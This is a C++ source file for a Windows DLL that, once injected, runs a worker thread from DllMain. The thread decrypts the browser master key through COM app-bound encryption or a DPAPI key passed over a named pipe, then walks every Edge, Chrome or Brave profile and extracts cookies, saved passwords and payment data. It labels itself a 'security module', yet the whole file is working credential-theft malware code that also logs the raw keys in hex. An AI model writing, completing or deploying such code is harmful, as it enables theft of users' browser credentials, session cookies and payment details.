// CryptCore.cpp - Security module entry point and workflow coordination
// Implements split-key strategy for Edge: COM for cookies/payments, DPAPI for passwords
#include "CryptCore.h"
#include "BrowserCrypto.h"
#include "DataExtraction.h"
#include "CommunicationModule.h"
#include "SelfLoader.h"
#include <memory>
#include <stdexcept>

namespace SecurityComponents
{
    // Initializes security orchestrator and establishes pipe communication
    SecurityOrchestrator::SecurityOrchestrator(LPCWSTR lpcwstrPipeName)
    {
        m_logger.emplace(lpcwstrPipeName);
        
        if (!m_logger->isValid())
        {
            throw std::runtime_error("Failed to connect to named pipe from orchestrator.");
        }
        ReadPipeParameters();
    }

    // Main execution workflow: decrypt keys, enumerate profiles, extract data
    void SecurityOrchestrator::Run()
    {
        BrowserManager browserManager;
        const auto& browserConfig = browserManager.getConfig();
        m_logger->Log("[*] Security analysis process started for " + browserConfig.name);
        
        std::vector<uint8_t> comKey, dpapiKey;
        fs::path localStatePath = browserManager.getUserDataRoot() / "Local State";
        
        // Edge: try COM first (app_bound_encrypted_key — modern APPB cookies & passwords),
        // fall back to pre-extracted DPAPI key if COM is unavailable.
        if (browserConfig.name == "Edge")
        {
            bool comOk = false;
            try
            {
                m_logger->Log("[*] Attempting COM key strategy for Edge");
                MasterKeyDecryptor keyDecryptor(*m_logger);
                comKey = keyDecryptor.Decrypt(browserConfig, localStatePath, DataType::All);
                dpapiKey = comKey;
                m_logger->Log("[+] Edge COM key obtained: " + Utils::BytesToHexString(comKey));
                comOk = true;
            }
            catch (const std::exception& e)
            {
                m_logger->Log("[!] Edge COM key failed: " + std::string(e.what()));
            }

            if (!comOk)
            {
                if (!m_edgeDpapiKey.empty())
                {
                    comKey  = m_edgeDpapiKey;
                    dpapiKey = m_edgeDpapiKey;
                    m_logger->Log("[*] Falling back to DPAPI key: " + Utils::BytesToHexString(comKey));
                }
                else
                {
                    m_logger->Log("[-] No key available for Edge - extraction skipped");
                    return;
                }
            }
        }
        else 
        {
            // Chrome/Brave use single COM-elevated key for all data types
            m_logger->Log("[*] Initializing single-key strategy for " + browserConfig.name);
            MasterKeyDecryptor keyDecryptor(*m_logger);
            comKey = keyDecryptor.Decrypt(browserConfig, localStatePath, DataType::All);
            dpapiKey = comKey;
            m_logger->Log("[+] Single COM key: " + Utils::BytesToHexString(comKey));
        }
        
        // Enumerate all browser profiles
        ProfileEnumerator enumerator(browserManager.getUserDataRoot(), *m_logger);
        auto profilePaths = enumerator.FindProfiles();
        m_logger->Log("[+] Found " + std::to_string(profilePaths.size()) + " profile(s)");

        // Extract data from each profile
        for (const auto& profilePath : profilePaths) 
        {
            m_logger->Log("[*] Processing profile: " + StringUtils::path_to_string(profilePath.filename()));
            
            for (const auto& dataConfig : Data::GetExtractionConfigs()) 
            {
                // All data types use comKey (Edge and Chrome/Brave both use COM/APPB)
                const std::vector<uint8_t>* extractionKey = &comKey;
                m_logger->Log("[*] Using COM key for " + dataConfig.outputFileName + " extraction");
                
                try {
                    DataExtractor extractor(profilePath, dataConfig, *extractionKey, *m_logger, 
                                          m_outputPath, browserConfig.name);
                    extractor.Extract();
                } catch (const std::exception& e) {
                    m_logger->Log("[-] Extraction failed for " + dataConfig.outputFileName + ": " + 
                                std::string(e.what()));
                }
            }
        }

        m_logger->Log("[*] Security analysis process finished successfully");
    }

    // Reads configuration parameters from orchestrator via named pipe
    void SecurityOrchestrator::ReadPipeParameters()
    {
        char buffer[1024] = {0};
        DWORD bytesRead = 0;
        
        // Read verbose flag
        if (!ReadFile(m_logger->getHandle(), buffer, sizeof(buffer) - 1, &bytesRead, nullptr) || bytesRead == 0)
        {
            m_logger->Log("[-] Failed to read verbose flag from pipe");
            return;
        }
        
        // Read output path
        memset(buffer, 0, sizeof(buffer));
        if (!ReadFile(m_logger->getHandle(), buffer, sizeof(buffer) - 1, &bytesRead, nullptr) || bytesRead == 0)
        {
            m_logger->Log("[-] Failed to read output path from pipe");
            return;
        }
        buffer[bytesRead] = '\0';
        m_outputPath = buffer;
        m_logger->Log("[*] Output path configured: " + StringUtils::path_to_string(m_outputPath));
        
        // Read DPAPI key (Edge only)
        memset(buffer, 0, sizeof(buffer));
        if (!ReadFile(m_logger->getHandle(), buffer, sizeof(buffer) - 1, &bytesRead, nullptr) || bytesRead == 0)
        {
            m_logger->Log("[-] Failed to read DPAPI key from pipe");
            return;
        }
        buffer[bytesRead] = '\0';
        
        // Parse DPAPI key message
        try {
            std::string dpapiKeyMsg(buffer);
            
            if (dpapiKeyMsg.find("DPAPI_KEY:") == 0)
            {
                std::string hexKey = dpapiKeyMsg.substr(10);
                
                if (hexKey != "NONE" && hexKey.length() >= 64)
                {
                    m_edgeDpapiKey.resize(32);
                    for (size_t i = 0; i < 32; ++i)
                    {
                        std::string byteStr = hexKey.substr(i * 2, 2);
                        unsigned long byte = std::stoul(byteStr, nullptr, 16);
                        m_edgeDpapiKey[i] = static_cast<uint8_t>(byte);
                    }
                    m_logger->Log("[+] Received pre-decrypted DPAPI key from orchestrator: " + 
                                std::to_string(m_edgeDpapiKey.size()) + " bytes");
                }
                else
                {
                    m_logger->Log("[*] No DPAPI key from orchestrator");
                }
            }
            else
            {
                m_logger->Log("[-] Invalid DPAPI key message format");
            }
        }
        catch (const std::exception& e)
        {
            m_logger->Log("[-] Exception parsing DPAPI key: " + std::string(e.what()));
        }
    }
}

// Security module worker thread entry point
DWORD WINAPI SecurityModuleWorker(LPVOID lpParam)
{
    auto thread_params = std::unique_ptr<ModuleThreadParams>(static_cast<ModuleThreadParams*>(lpParam));

    try
    {
        SecurityComponents::SecurityOrchestrator orchestrator(
            static_cast<LPCWSTR>(thread_params->lpPipeNamePointerFromOrchestrator));
        orchestrator.Run();
    }
    catch (const std::exception& e)
    {
        try
        {
            SecurityComponents::PipeLogger errorLogger(
                static_cast<LPCWSTR>(thread_params->lpPipeNamePointerFromOrchestrator));
            if (errorLogger.isValid())
            {
                errorLogger.Log("[-] CRITICAL SECURITY MODULE ERROR: " + std::string(e.what()));
				errorLogger.Log("__DLL_PIPE_COMPLETION_SIGNAL__");
            }
        }
        catch (...) {}
    }

    FreeLibraryAndExitThread(thread_params->hModule_dll, 0);
    return 0;
}

// DLL entry point - creates worker thread for asynchronous execution
BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved)
{
    if (reason == DLL_PROCESS_ATTACH)
    {
        DisableThreadLibraryCalls(hModule);

        auto params = new (std::nothrow) ModuleThreadParams{hModule, lpReserved};
        if (!params) return TRUE;

        HANDLE hThread = CreateThread(NULL, 0, SecurityModuleWorker, params, 0, NULL);
        if (hThread)
        {
            CloseHandle(hThread);
        }
        else
        {
            delete params;
        }
    }
    return TRUE;
}